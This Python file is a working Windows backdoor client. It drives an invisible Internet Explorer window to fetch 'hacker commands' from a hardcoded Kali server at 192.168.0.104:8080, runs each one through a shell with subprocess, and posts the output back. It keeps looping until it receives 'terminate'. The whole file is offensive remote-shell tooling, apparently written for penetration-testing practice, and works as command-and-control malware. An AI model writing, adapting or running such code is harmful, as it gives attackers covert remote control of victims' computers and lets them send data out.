
from win32com.client import Dispatch
from time import sleep
import subprocess


ie = Dispatch("InternetExplorer.Application")  
ie.Visible = 0  # Make it invisible [ run in background ] (1= invisible)


# Paramaeters for POST
dURL = 'http://192.168.0.104:8080'
Flags = 0
TargetFrame  = ""

while True:

    ie.Navigate('http://192.168.0.104:8080') # Navigate to our kali web server to grab the hacker commands
    
    while ie.ReadyState != 4:    # Wait for browser to finish loading.
        sleep(1)
                

    command = ie.Document.body.innerHTML
    
    #command = unicode(command) # Converts HTML entities to unicode.  For example '&amp;'  becomes '&'
    command = command.encode('ascii','ignore')   
   

    if 'terminate' in command.decode(): # if the received command was terminate
        ie.Quit()
        break

    else: 
        CMD =  subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

        Data = CMD.stdout.read()
        #Data = Data.decode()
        PostData =bytes(memoryview(Data))
                                
        ie.Navigate( dURL, Flags, TargetFrame, PostData )


    sleep(3)








